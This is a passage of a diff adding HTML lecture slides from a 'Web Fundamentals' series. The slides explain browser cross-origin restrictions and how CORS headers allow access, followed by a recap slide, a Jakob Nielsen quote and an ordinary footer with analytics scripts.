+          <li>You are not logged in—there are no cookies.</li>
+        </ul>
+      </li>
+      <li>
+        When the browser requests that page,<br>
+        the page might contain personal information.
+        <ul class="next">
+          <li>You might be logged in—browsers maintain cookies.</li>
+        </ul>
+      </li>
+      <li class="next">
+        As a result, browsers block cross-origin requests.
+        <ul>
+          <li>an <em>origin</em> more or less corresponds to a <em>domain</em></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="cors">
+    <h2>
+      <a href="https://www.w3.org/TR/cors/">Cross-Origin Resource Sharing (CORS)</a>
+      enables others to access your pages.
+    </h2>
+    <ul>
+      <li class="next">
+        Activate CORS to enable <a href="./web-apis/">Web APIs</a> access
+        from within other browser-based Web applications.
+      </li>
+      <li class="next">
+        The browser adds an <code>Origin</code> header to requests.
+        <ul>
+          <li><code>Origin: https://my.site</code></li>
+        </ul>
+      </li>
+      <li class="next">
+        If the server allows requests from that origin,<br>
+        it adds <code>Access-Control-Allow-Origin</code>.
+        <ul>
+          <li><code>Access-Control-Allow-Origin: https://my.site</code></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="toc slide" id="recap">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="nielsen">
+    <blockquote>
+      <p>
+        Users spend most of their time on other sites.
+      </p>
+      <p class="next">
+         This means that users prefer your site to work the same way as all the other sites they already know.
+      </p>
+      <cite><a href="https://www.nngroup.com/articles/end-of-web-design/">Jakob Nielsen</a></cite>
+    </blockquote>
+  </div>
+
+  <footer>
+    <p class="badge"><a href="https://github.com/RubenVerborgh/WebFundamentals">View on GitHub</a></p>
+    <p class="license">
+      <a rel="license" href="https://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" src="../_shared/images/cc-by-small.svg" /></a>
+      Except where otherwise noted, the content of these slides is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </p>
+  </footer>
+  <script src="../_shared/scripts/shower.min.js"></script>
+  <script src="../_shared/scripts/enhancements.js"></script>
+  <script async src="//platform.twitter.com/widgets.js"></script>
+  <script>ga=function(){ga.q.push(arguments)};ga.q=[['create','UA-6142365-12','auto'],['require','autotrack'],['send','pageview']];ga.l=1*new Date</script>
+  <script async src="//www.google-analytics.com/analytics.js"></script>
+  <script async src="../_shared/scripts/autotrack.js"></script>
+</body>
+</html>
